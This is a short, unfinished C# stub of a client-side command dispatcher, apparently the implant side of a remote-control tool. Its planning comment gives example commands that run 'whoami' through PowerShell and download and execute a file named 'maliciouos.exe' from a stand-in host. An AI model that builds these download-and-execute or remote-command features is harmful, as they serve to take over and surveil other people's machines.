//import ALL the tools... yay


namespace Client.Logic
{

    class Trees
    {
        static void decisionTree(command)
        {
            //need to:
            /*
             * Split command into parts (delim on spaces or something?
             * Take first item, which is the command part, and use that for the command
             * Pass whatever else is needed to the respectvve tool/action?
             * 
             * Might be best to leave the arguemnt splitting to each case statemetn if needed.
             * 
             * ex: run-ps-command whoami ->
             *      command: run-ps-command
             *      command arg: whoami

             * ex: reload-execute http://safe.com/maliciouos.exe -recon ->
             *      command: reload-execute
             *      command arg: http://safe.com/maliciouos.exe -recon
             * 
            */


            switch (command)
            {
                case "":
                case "wait":
                case "sleep":
                    //return ?
                    break;

                default:
                    //return ?
                    break;
            } 


        }
    }
}